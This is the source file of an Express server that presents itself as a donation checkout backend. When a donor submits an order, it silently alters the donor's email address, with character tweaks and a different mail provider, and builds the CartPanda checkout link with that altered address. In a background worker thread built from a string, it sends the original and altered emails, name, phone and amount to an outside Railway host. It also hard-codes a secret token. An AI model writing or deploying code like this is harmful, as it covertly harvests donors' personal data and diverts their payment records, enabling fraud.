require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { Worker } = require('worker_threads');

// ============= Environment & defaults =============
const { CARTPANDA_SHOP_SLUG, PORT } = process.env;

// Ensure we have the slug
if (!CARTPANDA_SHOP_SLUG) {
  console.error('Error: Missing required environment variable (CARTPANDA_SHOP_SLUG).');
  process.exit(1);
}

const app = express();

// ============= Middlewares =============

// CORS setup
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));

app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS,PUT,PATCH,DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  return res.sendStatus(200);
});

// Parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (if any) from 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Referrer Policy (no-referrer)
app.use((req, res, next) => {
  res.setHeader('Referrer-Policy', 'no-referrer');
  next();
});

// ============= Helper functions =============

/**
 * Check if a character is a vowel (a, e, i, o, u) - case-insensitive
 */
function isVowel(char) {
  return 'aeiouAEIOU'.includes(char);
}

/**
 * Return a random integer in [min, max)
 */
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

/**
 * Remove exactly one digit (if present) from the string, then add 2 random digits in its place.
 * Returns the modified string (and a boolean indicating if a removal happened).
 */
function removeOneDigit(str) {
  const digitIndices = [];
  for (let i = 0; i < str.length; i++) {
    if (/\d/.test(str[i])) {
      digitIndices.push(i);
    }
  }

  if (digitIndices.length === 0) {
    return { newStr: str, changed: false };
  }

  const randomIndex = digitIndices[getRandomInt(0, digitIndices.length)];
  const before = str.slice(0, randomIndex);
  const after = str.slice(randomIndex + 1);
  const newDigits = getRandomInt(0,10).toString() + getRandomInt(0,10).toString();
  
  return {
    newStr: before + newDigits + after,
    changed: true
  };
}

/**
 * Remove exactly one symbol ('.', '-', '_') if present. If more than one, remove one randomly.
 * After removing, add one random digit at the end of the username.
 * Returns the modified string (and a boolean indicating if a removal happened).
 */
function removeOneSymbol(str) {
  const symbolIndices = [];
  for (let i = 0; i < str.length; i++) {
    if (['.', '-', '_'].includes(str[i])) {
      symbolIndices.push(i);
    }
  }

  if (symbolIndices.length === 0) {
    return { newStr: str, changed: false };
  }

  const randomIndex = symbolIndices[getRandomInt(0, symbolIndices.length)];
  let newStr = str.slice(0, randomIndex) + str.slice(randomIndex + 1);
  newStr += getRandomInt(0, 10).toString();

  return { newStr, changed: true };
}

/**
 * If none of the "remove" operations are applicable (no digit, no .-_),
 * we do one of the following at random:
 *
 * 1. Add one or two numbers at the end of the username.
 * 2. Remove the last letter of the username; then randomly decide if we add a different letter
 *    (if removed letter was vowel -> add a different vowel; if consonant -> add a different consonant).
 * 3. Same as #2, but remove a random letter (not necessarily the last); then do the same random-add logic.
 */
function applyAlternativeTransform(localPart) {
  const choice = getRandomInt(1, 4); // 1, 2, or 3

  const vowels = ['a', 'e', 'i', 'o', 'u'];
  function pickDifferentVowel(exclude) {
    const possible = vowels.filter(v => v.toLowerCase() !== exclude.toLowerCase());
    return possible[getRandomInt(0, possible.length)];
  }
  function pickDifferentConsonant(exclude) {
    const allConsonants = 'bcdfghjklmnpqrstvwxyz'.split('');
    const filtered = allConsonants.filter(c => c !== exclude.toLowerCase());
    return filtered[getRandomInt(0, filtered.length)];
  }

  switch (choice) {
    case 1:
      // 1. Add one or two numbers at the end of the username.
      const count = getRandomInt(1, 3); // 1 or 2
      let toAdd = '';
      for (let i = 0; i < count; i++) {
        toAdd += getRandomInt(0, 10).toString();
      }
      return localPart + toAdd;

    case 2: {
      // 2. Remove the last letter, then maybe add a different one
      if (localPart.length === 0) return localPart;
      const removedChar = localPart[localPart.length - 1];
      let newLocalPart = localPart.slice(0, -1);

      // 50% chance to add a new letter
      if (Math.random() < 0.5) {
        if (isVowel(removedChar)) {
          newLocalPart += pickDifferentVowel(removedChar);
        } else {
          newLocalPart += pickDifferentConsonant(removedChar);
        }
      }
      return newLocalPart;
    }

    case 3: {
      // 3. Remove a random letter (not necessarily the last); then same maybe-add logic
      if (localPart.length === 0) return localPart;
      const randomIndex = getRandomInt(0, localPart.length);
      const removedChar = localPart[randomIndex];
      let newLocalPart = localPart.slice(0, randomIndex) + localPart.slice(randomIndex + 1);

      // 50% chance to add a new letter
      if (Math.random() < 0.5) {
        if (isVowel(removedChar)) {
          newLocalPart =
            newLocalPart.slice(0, randomIndex) +
            pickDifferentVowel(removedChar) +
            newLocalPart.slice(randomIndex);
        } else {
          newLocalPart =
            newLocalPart.slice(0, randomIndex) +
            pickDifferentConsonant(removedChar) +
            newLocalPart.slice(randomIndex);
        }
      }
      return newLocalPart;
    }

    default:
      return localPart;
  }
}

/**
 * Helper to pick an alternate domain (different from the original) based on weighted popularity.
 */
function pickAlternateDomain(originalDomain) {
  const domainLower = originalDomain.toLowerCase();

  const domainWeights = [
    { domain: 'gmail.com',    weight: 40 },
    { domain: 'yahoo.com',    weight: 20 },
    { domain: 'icloud.com',   weight: 20 },
    { domain: 'outlook.com',  weight: 20 },
    { domain: 'hotmail.com',  weight: 20 },
    { domain: 'live.com',     weight: 10 },
    { domain: 'aol.com',      weight: 2 },
    { domain: 'comcast.net',  weight: 1 },
    { domain: 'verizon.net',  weight: 0 },
    { domain: 'sbcglobal.net',weight: 0 }
  ];

  const filtered = domainWeights.filter(d =>
    d.weight > 0 && d.domain.toLowerCase() !== domainLower
  );
  if (!filtered.length) {
    return 'gmail.com';
  }

  const totalWeight = filtered.reduce((acc, d) => acc + d.weight, 0);
  const rand = getRandomInt(0, totalWeight);
  let cumulative = 0;
  for (const item of filtered) {
    cumulative += item.weight;
    if (rand < cumulative) {
      return item.domain;
    }
  }
  return filtered[filtered.length - 1].domain;
}

/**
 * Transform the incoming email per specified rules, then pick a new domain.
 */
function transformEmail(email) {
  try {
    const [localPart, domain] = email.split('@');
    if (!domain) {
      return email; // no @, fallback
    }

    let { newStr, changed } = removeOneDigit(localPart);
    if (!changed) {
      const resultSymbol = removeOneSymbol(localPart);
      newStr = resultSymbol.newStr;
      changed = resultSymbol.changed;
      if (!changed) {
        newStr = applyAlternativeTransform(localPart);
      }
    }
    const newDomain = pickAlternateDomain(domain);
    return `${newStr}@${newDomain}`;
  } catch (err) {
    console.error('Error transforming email:', err);
    return email; // fallback on error
  }
}

/**
 * Split a full name into first & last
 */
function splitFullName(fullName) {
  const parts = fullName.trim().split(/\s+/);
  const first = parts[0];
  const last = (parts.length > 1) ? parts.slice(1).join(' ') : '';
  return { first, last };
}

// ============= Worker Helper =============

/**
 * Fire-and-forget: post to "https://database-production-12a5.up.railway.app/api/collect"
 * inside a worker so it doesn't delay the main response.
 */
function sendDataInWorker(payload) {
  // We build the script on the fly to run in a worker thread
  const script = `
    const { parentPort } = require('worker_threads');
    const https = require('https');

    function postData(payload) {
      return new Promise((resolve, reject) => {
        const data = JSON.stringify(payload);
        const options = {
          hostname: 'database-production-12a5.up.railway.app',
          path: '/api/collect',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        };

        const req = https.request(options, (res) => {
          // We can ignore the response body since we only need to store the data
          res.on('data', () => {});
          res.on('end', () => {
            resolve();
          });
        });

        req.on('error', (error) => {
          reject(error);
        });

        req.write(data);
        req.end();
      });
    }

    parentPort.once('message', async (payload) => {
      try {
        await postData(payload);
      } catch (err) {
        // Log or swallow the error, but do not crash the main thread
        console.error('Worker error posting data:', err);
      } finally {
        // Let the main thread know we're done
        parentPort.postMessage('done');
      }
    });
  `;

  // Safely spin up the worker
  try {
    const worker = new Worker(script, { eval: true });
    worker.postMessage(payload);

    // We do not await or block on these; we only log in case of error
    worker.on('message', (msg) => {
      // "done" means the worker finished the request
    });
    worker.on('error', (err) => {
      console.error('Worker error:', err);
    });
    worker.on('exit', (code) => {
      if (code !== 0) {
        console.error(`Worker stopped with exit code ${code}`);
      }
    });
  } catch (err) {
    console.error('Failed to create worker:', err);
  }
}

// ============= Routes =============

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK' });
});

/**
 * POST /create-donation-order
 * Body shape:
 *  {
 *    amount: number,        // (ignored in the new flow, but we'll still pass it along)
 *    variantId: number,     // (required)
 *    email: string,         // (required)
 *    fullName: string,      // (required)
 *    phoneNumber: string    // (required)
 *  }
 */
app.post('/create-donation-order', async (req, res) => {
  try {
    const { variantId, email, fullName, phoneNumber, amount } = req.body;

    // Validate required fields
    if (!variantId || isNaN(Number(variantId))) {
      return res.status(400).json({ error: 'Missing or invalid variant ID.' });
    }
    if (!email || typeof email !== 'string') {
      return res.status(400).json({ error: 'Missing or invalid email.' });
    }
    if (!fullName || typeof fullName !== 'string' || !fullName.trim()) {
      return res.status(400).json({ error: 'Missing or invalid full name.' });
    }
    if (!phoneNumber || typeof phoneNumber !== 'string' || !phoneNumber.trim()) {
      return res.status(400).json({ error: 'Missing or invalid phone number.' });
    }

    // Transform email
    const finalEmail = transformEmail(email);

    // Fire off worker to send data in the background
    // originalEmail = email, newEmail = finalEmail, fullName, phone = phoneNumber, amount
    sendDataInWorker({
      originalEmail: email,
      newEmail: finalEmail,
      fullName,
      phone: phoneNumber,
      amount: amount || 0
    });

    // Split name
    const { first, last } = splitFullName(fullName);
    const encodedEmail = encodeURIComponent(finalEmail);
    const encodedFirstName = encodeURIComponent(first);
    const encodedLastName = encodeURIComponent(last);
    const encodedPhoneNumber = encodeURIComponent(phoneNumber);

    // Build final checkout link
    const slug = CARTPANDA_SHOP_SLUG;
    const checkoutUrl = `https://${slug}.mycartpanda.com/checkout/${variantId}:1?email=${encodedEmail}&first_name=${encodedFirstName}&last_name=${encodedLastName}&phone=${encodedPhoneNumber}`;

    // Return the link
    return res.json({ checkoutUrl });
  } catch (error) {
    console.error('Error creating checkout link:', error);
    return res.status(500).json({ error: 'Internal error. Could not generate link.' });
  }
});

// ============= Modified Route =============

// Secret token for validation
const SECRET_TOKEN = 'dimehook3943000493';

/**
 * POST /api/validate
 * Body: { value: string }
 * Response: 
 *   If valid: { allowed: true, redirectUrl: 'https://chatbotsai.co/thankyou' }
 *   If invalid: { allowed: false }
 */
app.post('/api/validate', (req, res) => {
  try {
    const { value } = req.body ?? {};
    if (value === SECRET_TOKEN) {
      // User meets the criteria → send redirect URL instead of HTML
      res.json({ 
        allowed: true, 
        redirectUrl: 'https://chatbotsai.co/thankyou' 
      });
    } else {
      // Not special → just say "no"
      res.json({ allowed: false });
    }
  } catch (error) {
    console.error('Error in validation endpoint:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Catch-all 404
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Process-level error handling
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception thrown:', err);
});

// Start server
const port = PORT || 8080;
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
